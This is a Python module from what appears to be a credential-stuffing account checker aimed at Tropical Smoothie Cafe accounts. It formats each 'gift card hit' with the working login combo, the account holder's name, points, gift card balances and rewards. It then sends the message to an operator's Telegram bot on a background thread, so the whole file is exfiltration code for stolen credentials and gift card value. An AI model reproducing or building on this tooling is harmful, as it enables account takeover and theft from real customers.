"""Telegram notifications for gift card hits."""

from __future__ import annotations

import json
import os
import threading
from typing import Any

import requests

_updates_lock = threading.Lock()

from .api import AccountResult, format_gift_card

BRAND_NAME = os.environ.get("TROPIC_BRAND_NAME", "Tropical Smoothie Cafe")


def _data_dir() -> str:
    return os.environ.get("TROPIC_DATA_DIR", "data")


def _chat_id_file() -> str:
    return os.path.join(_data_dir(), "telegram_chat_id")


def _offset_file() -> str:
    return os.path.join(_data_dir(), "telegram_updates_offset")


def _discovered_chats_file() -> str:
    return os.path.join(_data_dir(), "telegram_discovered_chats.json")


def _load_discovered_chats() -> dict[str, dict[str, Any]]:
    try:
        with open(_discovered_chats_file(), encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict):
            return data
    except (OSError, json.JSONDecodeError):
        pass
    return {}


def _save_discovered_chats(chats: dict[str, dict[str, Any]]) -> None:
    os.makedirs(_data_dir(), exist_ok=True)
    with open(_discovered_chats_file(), "w", encoding="utf-8") as fh:
        json.dump(chats, fh)


def _load_offset() -> int:
    try:
        with open(_offset_file(), encoding="utf-8") as fh:
            return int(fh.read().strip() or 0)
    except (OSError, ValueError):
        return 0


def _save_offset(offset: int) -> None:
    os.makedirs(_data_dir(), exist_ok=True)
    with open(_offset_file(), "w", encoding="utf-8") as fh:
        fh.write(str(offset))


def _poll_updates() -> dict[str, dict[str, Any]]:
    token = _bot_token()
    if not token:
        return _load_discovered_chats()

    with _updates_lock:
        chats = _load_discovered_chats()
        offset = _load_offset()
        try:
            resp = requests.get(
                f"https://api.telegram.org/bot{token}/getUpdates",
                params={"offset": offset, "timeout": 0},
                timeout=15,
            )
            data = resp.json()
            if not data.get("ok"):
                return chats
            for item in data.get("result", []):
                update_id = int(item.get("update_id", 0))
                if update_id >= offset:
                    offset = update_id + 1
                msg = item.get("message") or item.get("edited_message") or {}
                chat = msg.get("chat") or {}
                chat_id = chat.get("id")
                if chat_id is None:
                    continue
                key = str(chat_id)
                chats[key] = {
                    "chat_id": key,
                    "type": chat.get("type"),
                    "username": chat.get("username"),
                    "first_name": chat.get("first_name"),
                    "last_name": chat.get("last_name"),
                }
            if offset:
                _save_offset(offset)
            _save_discovered_chats(chats)
        except requests.RequestException:
            pass
        return chats


def is_configured() -> bool:
    return bool(_bot_token() and _chat_id())


def _bot_token() -> str:
    return os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()


def _chat_id() -> str:
    env_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if env_id:
        return env_id
    path = _chat_id_file()
    try:
        with open(path, encoding="utf-8") as fh:
            return fh.read().strip()
    except OSError:
        return ""


def save_chat_id(chat_id: str) -> None:
    chat_id = str(chat_id).strip()
    if not chat_id:
        return
    os.makedirs(_data_dir(), exist_ok=True)
    with open(_chat_id_file(), "w", encoding="utf-8") as fh:
        fh.write(chat_id)
    os.environ["TELEGRAM_CHAT_ID"] = chat_id


def _pick_chat(chats: list[dict[str, Any]], preferred_chat_id: str | None = None) -> dict[str, Any] | None:
    if preferred_chat_id:
        for chat in chats:
            if str(chat.get("chat_id")) == str(preferred_chat_id):
                return chat
    for chat in chats:
        if chat.get("type") == "private":
            return chat
    return chats[0] if chats else None


def register_first_pending_chat(preferred_chat_id: str | None = None) -> tuple[bool, str, str]:
    chats = list(_poll_updates().values())
    if not chats:
        return False, "no pending chats — open Telegram and send /start to @tropicalhitsbot", ""
    picked = _pick_chat(chats, preferred_chat_id)
    if not picked:
        return False, "no pending chats — open Telegram and send /start to @tropicalhitsbot", ""
    chat_id = str(picked["chat_id"])
    save_chat_id(chat_id)
    return True, "registered", chat_id


def has_gift_cards(result: AccountResult) -> bool:
    return bool(result.gift_cards)


def format_gift_card_hit(result: AccountResult) -> str:
    lines = [
        f"🌴 GIFT CARD HIT — {BRAND_NAME}",
        "",
        f"Login: {result.combo}",
    ]
    if result.display_name:
        lines.append(f"Name: {result.display_name}")
    lines.append(f"Points: {result.points or 0}")

    total = result.gift_card_balance
    lines.append("")
    lines.append(f"💳 Gift Cards (${total:.2f} total):")
    for i, card in enumerate(result.gift_cards, 1):
        detail = format_gift_card(card)
        lines.append(f"  {i}) {detail}")

    lines.append("")
    lines.append("🎁 Rewards:")
    if result.rewards:
        for reward in result.rewards[:10]:
            name = reward.get("name") or "Reward"
            exp = reward.get("expiring_at") or reward.get("expiring_at_tz")
            if exp:
                lines.append(f"  • {name} (exp {exp})")
            else:
                lines.append(f"  • {name}")
        if len(result.rewards) > 10:
            lines.append(f"  • ... +{len(result.rewards) - 10} more")
    else:
        lines.append("  • none")

    referral = (result.profile or {}).get("referral_code")
    if referral:
        lines.append("")
        lines.append(f"Referral: {referral}")

    return "\n".join(lines)


def send_message(text: str) -> tuple[bool, str]:
    token = _bot_token()
    chat_id = _chat_id()
    if not token:
        return False, "TELEGRAM_BOT_TOKEN not set"
    if not chat_id:
        return False, "TELEGRAM_CHAT_ID not set — message @tropicalhitsbot then check /api/telegram/status"

    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "disable_web_page_preview": True,
            },
            timeout=15,
        )
        data = resp.json()
        if resp.ok and data.get("ok"):
            return True, "sent"
        return False, data.get("description", resp.text[:200])
    except requests.RequestException as exc:
        return False, str(exc)


def notify_gift_card_hit(result: AccountResult) -> None:
    if not has_gift_cards(result) or not is_configured():
        return

    text = format_gift_card_hit(result)

    def _send() -> None:
        send_message(text)

    threading.Thread(target=_send, daemon=True).start()


def get_pending_chat_ids() -> list[dict[str, Any]]:
    return list(_poll_updates().values())
